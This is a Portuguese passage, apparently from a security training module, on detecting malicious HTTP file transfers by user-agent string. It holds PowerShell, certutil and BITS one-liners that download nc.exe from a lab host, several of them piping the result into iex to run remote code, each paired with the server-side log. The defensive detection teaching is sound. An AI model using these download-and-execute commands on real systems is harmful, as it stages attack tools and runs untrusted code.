A detecção de linha de comando com base na lista negra é direta para ignorar, mesmo usando ofuscação simples. No entanto, embora o processo de lista de permissões em todas as linhas de comando em um ambiente específico seja inicialmente demorado, ele é muito robusto e permite detecção e alerta rápidos em qualquer linha de comando incomum.

A maioria dos protocolos cliente-servidor exige que o cliente e o servidor negociem como o conteúdo será entregue antes de trocar informações. Isso é comum com o `HTTP` protocolo. É necessário interoperabilidade entre diferentes servidores da Web e tipos de navegadores da web para garantir que os usuários tenham a mesma experiência, independentemente do navegador. Os clientes HTTP são mais facilmente reconhecidos por sua sequência de agentes do usuário, que o servidor usa para identificar qual `HTTP` o cliente está se conectando a ele, por exemplo, Firefox, Chrome etc.

Os agentes do usuário não são usados apenas para identificar navegadores da web, mas qualquer coisa que atue como um `HTTP` cliente e conectando-se a um servidor web via `HTTP` pode ter uma sequência de agente do usuário ( ou seja., `cURL`, um costume `Python` script ou ferramentas comuns, como `sqlmap`, ou `Nmap`).

As organizações podem tomar algumas medidas para identificar possíveis cadeias de agentes do usuário, primeiro criando uma lista de cadeias de agentes legítimos conhecidos, agentes de usuários usados pelos processos padrão do sistema operacional, agentes de usuário comuns usados por serviços de atualização, como Windows Update, atualizações de antivírus, etc. Eles podem ser alimentados em uma ferramenta SIEM usada para a caça de ameaças para filtrar o tráfego legítimo e focar em anomalias que podem indicar comportamento suspeito. Quaisquer cadeias de agentes de usuários com aparência suspeita podem ser investigadas para determinar se foram usadas para executar ações maliciosas. Este [site](http://useragentstring.com/index.php) é útil para identificar cadeias comuns de agentes de usuários. Uma lista de cadeias de agentes do usuário está disponível [aqui](http://useragentstring.com/pages/useragentstring.php).

Transferências maliciosas de arquivos também podem ser detectadas por seus agentes de usuário. Os seguintes agentes / cabeçalhos de usuário foram observados em comum `HTTP` técnicas de transferência ( testadas no Windows 10, versão 10.0.14393, com PowerShell 5 ).

#### Invoke-WebRequest - Cliente

```powershell-session
PS C:\htb> Invoke-WebRequest http://10.10.10.32/nc.exe -OutFile "C:\Users\Public\nc.exe" 
PS C:\htb> Invoke-RestMethod http://10.10.10.32/nc.exe -OutFile "C:\Users\Public\nc.exe"
```

#### Invoke-WebRequest - Server

```shell-session
GET /nc.exe HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.14393.0
```

#### WinHttpRequest - Cliente

```powershell-session
PS C:\htb> $h=new-object -com WinHttp.WinHttpRequest.5.1;
PS C:\htb> $h.open('GET','http://10.10.10.32/nc.exe',$false);
PS C:\htb> $h.send();
PS C:\htb> iex $h.ResponseText
```

#### WinHttpRequest - Server

```shell-session
GET /nc.exe HTTP/1.1
Connection: Keep-Alive
Accept: */*
User-Agent: Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)
```

#### Msxml2 - Cliente

```powershell-session
PS C:\htb> $h=New-Object -ComObject Msxml2.XMLHTTP;
PS C:\htb> $h.open('GET','http://10.10.10.32/nc.exe',$false);
PS C:\htb> $h.send();
PS C:\htb> iex $h.responseText
```

#### Msxml2 - Servidor

```shell-session
GET /nc.exe HTTP/1.1
Accept: */*
Accept-Language: en-us
UA-CPU: AMD64
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E)
```

#### Certutil - Cliente

```powershell-session
PS C:\htb> certutil -urlcache -split -f http://10.10.10.32/nc.exe 
PS C:\htb> certutil -verifyctl -split -f http://10.10.10.32/nc.exe
```

#### Certutil - Server

```shell-session
GET /nc.exe HTTP/1.1
Cache-Control: no-cache
Connection: Keep-Alive
Pragma: no-cache
Accept: */*
User-Agent: Microsoft-CryptoAPI/10.0
```

#### BITS - Cliente

```powershell-session
PS C:\htb> Import-Module bitstransfer;
PS C:\htb> Start-BitsTransfer 'http://10.10.10.32/nc.exe' $env:temp\t;
PS C:\htb> $r=gc $env:temp\t;
PS C:\htb> rm $env:temp\t; 
PS C:\htb> iex $r
```

#### BITS - Servidor

```shell-session
HEAD /nc.exe HTTP/1.1
Connection: Keep-Alive
Accept: */*
Accept-Encoding: identity
User-Agent: Microsoft BITS/7.8
```

Esta seção apenas arranha a superfície ao detectar transferências maliciosas de arquivos. Seria um excelente começo para qualquer organização criar uma lista branca de binários permitidos ou uma lista negra de binários conhecidos por serem usados para fins maliciosos. Além disso, procurar por cadeias anômalas de agentes de usuários pode ser uma excelente maneira de capturar um ataque em andamento. Abordaremos as técnicas de caça e detecção de ameaças em profundidade nos módulos posteriores.